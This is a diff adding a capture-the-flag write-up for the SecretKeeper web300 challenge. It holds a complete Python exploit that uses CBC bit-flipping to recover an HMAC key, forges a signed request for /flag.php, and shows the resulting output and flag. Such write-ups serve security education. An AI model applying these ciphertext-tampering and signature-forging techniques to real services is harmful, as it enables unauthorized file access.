@@ -1,0 +1,116 @@
+<pre>
+by dcua
+
+Flag: mario_CBCm0d3_is_swag_huh_;)
+
+Idea:
+1. Decrypt secret_hmac via bitflipping of 2nd block and analysis of filename
+2. Tamper 3rd block with known secret_hmac
+3. Decrypt modified 2nd block
+4. Modify 1st block via decrypted 2nd block and known seceret_filename
+5. Recalculate sign with tampered 3rd block and new filename.
+
+Implementation:
+  $ cat o
+  #!/usr/bin/python
+
+  import requests as req
+  from itertools import *
+  from hashlib import *
+  import hmac
+
+  #url = 'localhost/web300.php'
+  url = 'challenges.wargame.vn:1337/web300_c4d7c1d9c925b4021adf5e192315ecb9/'
+
+  # GET parameter 'file'
+  #gf = 'cd66f0f581d0552f8c37327a4528fded6e2068da46e2bf737457e3ac8a1dc05a0bee87475a65217aae328447b15ea132bd2328c633b621e9b3ff89add061a044'
+  gf = 'b309e49c1e852b226b7799f033b36bb73ce2abd97c121b4eabc28d21c0540a42d4dbbde5c570737e818bb2c6ba67edf8758a8c6a242c4231c55daa3361a207ba'
+
+  def xor(a,b):
+          return ''.join([chr(ord(aa) ^ ord(bb)) for aa,bb in zip(a, cycle(b))])
+
+  def extract_sf(text):
+      idx = text.find('/secret/') + len('/secret/')
+      idx2 = text[idx:].find('">')
+      h = text[idx:idx+idx2]
+      h = ''.join(["%02x" % ord(a) for a in h])
+      return h.decode('hex')
+
+  r = req.get('http://%s?file=%s&sign=xxx' % (url, gf))
+  sf = extract_sf(r.text)
+
+  print 'secret_filename', sf
+
+  gfb = gf.decode('hex')
+  gf1 = gfb[:16] + '\x01' + gfb[17:]
+  r = req.get('http://%s?file=%s&sign=xxx' % (url, gf1.encode('hex')))
+  d = extract_sf(r.text)
+
+  print 'decode', d
+
+  sh = d[-16:]
+
+  print 'secret_hmac', sh.encode('hex')
+
+  block2 = xor(gfb[16:32], "A"*10 + "\x00"*7)
+  block2 = xor(block2, '|' + sh)
+
+  gf2 = gfb[:16] + block2 + gfb[32:32+16]
+
+  r = req.get('http://%s?file=%s&sign=xxx' % (url, gf2.encode('hex')))
+  b2 = extract_sf(r.text)[16:32]
+
+  print 'block2', b2.encode('hex')
+
+  b1 = xor(gfb[:16], b2)
+  b1 = xor(b1, '/flag.php|'.ljust(16, 'A'))
+
+  r = req.get('http://%s?file=%s&sign=xxx' % (url, (b1 + block2 + gfb[32:32+16]).encode('hex')))
+  sf = extract_sf(r.text)
+  print 'new file', sf.encode('hex')
+
+  sign = hmac.new('A'*16, sf, md5).hexdigest()
+
+  print  req.get('http://%s?file=%s&sign=%s' % (url, (b1 + block2 + gfb[32:32+16]).encode('hex'), sign)).text
+
+  $ ./o
+  secret_filename ee782ab3071c5cdd9e1848ceeb126e03
+  decode ee782ab3071c5cddd...
+  secret_hmac e564c9bf1397896ca7fcc0d08e29168c
+  block2 68eb2d32c22838beb734ff0aa02c3aea
+  new file bc8fd6af8c778b0f2df890509ee9689f2f666c61672e706870
+
+
+<!DOCTYPE html>
+<!--[if lt IE 7]> <html class="lt-ie9 lt-ie8 lt-ie7" lang="en"> <![endif]-->
+<!--[if IE 7]> <html class="lt-ie9 lt-ie8" lang="en"> <![endif]-->
+<!--[if IE 8]> <html class="lt-ie9" lang="en"> <![endif]-->
+<!--[if gt IE 8]><!--> <html lang="en"> <!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>SecretKeeper v1.0</title>
+  <link rel="stylesheet" href="css/style.css">
+  <!--[if lt IE 9]><script src="//html5shim.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+</head>
+<body><br /><br /><br />
+
+    <div class="mainform">
+      <h1>SecretKeeper v1.0</h1>
+                        <section class="notepaper">
+                    <figure class="quote">
+                        <blockquote class="curly-quotes" cite="./secret/¼ Ö¯Œw‹-ø PžéhŸ/flag.php">
+                            No flag for cheaters...go away!
+<?php
+// FLAG: mario_CBCm0d3_is_swag_huh_;)
+?> 
+
+                        </blockquote>
+                    </figure>
+                </section>
+        
+    </div>
+
+</body>
+</html>
+</pre>
